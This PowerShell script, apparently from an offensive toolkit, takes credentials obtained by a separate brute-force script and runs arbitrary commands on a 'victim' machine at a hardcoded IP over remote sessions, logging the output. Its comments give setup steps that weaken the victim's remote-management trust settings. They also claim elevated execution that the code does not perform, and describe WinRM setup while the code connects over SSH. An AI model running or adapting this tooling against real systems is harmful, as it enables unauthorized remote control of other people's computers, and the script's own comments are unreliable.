# Run bruteforceWindowsOS.ps1 first to get the password, then run this script to run arbitrary Powershell commands
# You can change the variables below as required
# This is the same as baseScript.ps1, but it runs the command as an elevated user

# To run this script, you need to run the following commands first:
# On victim:
# Enable-PSRemoting -Force
# Set-Item wsman:\localhost\client\trustedhosts *
# Restart-Service WinRM
# On attacker:
# Start-Service WinRM
# Set-Item wsman:\localhost\client\trustedhosts *
# Restart-Service WinRM

# Take in any number of command line parameters, sseparated by commas
# Example: .\baseScriptElevated.ps1 "Get-Service, Get-Process"

# Accept a single parameter as a string
param (
    [Parameter(Position = 0, Mandatory = $true)]
    [String]
    $Parameters
)

# Split the string into individual parameters using ; as a delimiter
$Params = $Parameters -split ';'

# Import a CSV file with credentials
$credential = Import-Csv -Path "Powershell\credentials.csv" | Select-Object -First 1

# Define a SSH private key file
$keyFile = "Powershell\accessKey"

# Define IP address
$ip = "100.87.185.10"

# Define filename + filepath to save to
$out = "Powershell\Output.txt"

$target = $credential.Username + "@" + $ip

# For each parameter, convert to scriptblock, create a new session, run the command
$Params | ForEach-Object {
    # Convert inner command to scriptblock format
    $sb = [scriptblock]::Create($_)

    # Connect to the remote host and run the command
    Invoke-Command -Session (New-PSSession -HostName $target -KeyFilePath $keyFile) -ScriptBlock $sb | Out-File -FilePath $out -Append

    # Check if last command ran successfully
    if($?)
    {
        Write-Host "Ran $_ successfully"
    }
    else 
    {
        write-Host "Failed running $_"
    }
}

# Removes all PSSessions
Get-PSSession | Remove-PSSession

# Check if last command ran successfully
if($?)
{
    Write-Host "Cleared all PSSessions"
}
else 
{
    write-Host "Failed"
}
